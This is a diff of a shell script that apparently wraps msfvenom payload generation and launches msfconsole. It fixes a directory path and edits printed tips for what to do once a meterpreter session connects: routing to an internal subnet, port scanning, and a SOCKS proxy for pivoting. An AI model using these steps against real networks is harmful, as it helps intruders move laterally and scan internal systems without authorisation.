@@ -7,7 +7,7 @@
 ################################################################
 
 # set workiunug dir
-cd \tmp\
+cd /tmp/
 
 # msfvenom generate payload
 read -p "[*] Linux or windows payload? (L/W): " payload
@@ -58,9 +58,9 @@ echo "
 echo "==================================================================="
 echo "         once meterpreter is connected use the following
      |
-     | set up pivot:     run autoroute -s 10.1.13.0/24 (change subnet)
-     | remot scan  :     use auxiliary/scanner/portscan/tcp (see options)
-     | or remote scan:   MSFMap x.x.x.y-z 
+     | Set up route:     run autoroute -s 10.1.13.0/24 (change subnet)
+     | Remot scan  :     use auxiliary/scanner/portscan/tcp (see options)
+     | Set proxy for pivot: use auxiliary/server/socks4a  (then set srvport)
      "
 echo "==================================================================="
 msfconsole
